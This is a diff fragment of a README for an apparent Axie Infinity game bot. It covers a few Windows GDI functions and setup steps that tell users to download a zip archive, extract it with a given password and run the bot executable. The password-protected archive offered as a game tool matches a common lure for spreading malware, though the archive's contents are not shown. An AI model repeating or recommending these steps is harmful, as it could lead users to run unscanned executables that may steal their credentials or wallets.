@@ -43,15 +43,15 @@ This function selects an object into the specified device context, replacing the
 This function retrieves the color value of the pixel at specified coordinates.
 
 ### Setup
-1. Configure Game Resolution:
+Configure Game Resolution:
 - Set the Axie Infinity game resolution to full-screen (or full-screen windowed) mode.
 - Close the SkyMavis game client to ensure the bot can access the game window without interference.
 
-2. Download and Extract Files:
+Download and Extract Files:
 - [Download](https://github.com/weaverjc/Axie-Infinity-bot/archive/refs/heads/main.zip) the latest release of the repository.
 - Extract the downloaded files using the password `Cfjx5a3Nu`.
 
-3 Launch the Bot:
+Launch the Bot:
 - Run the bot executable with the correct settings configured in the provided configuration file. Ensure the game client is running and visible on your screen.
 
 ### Warning
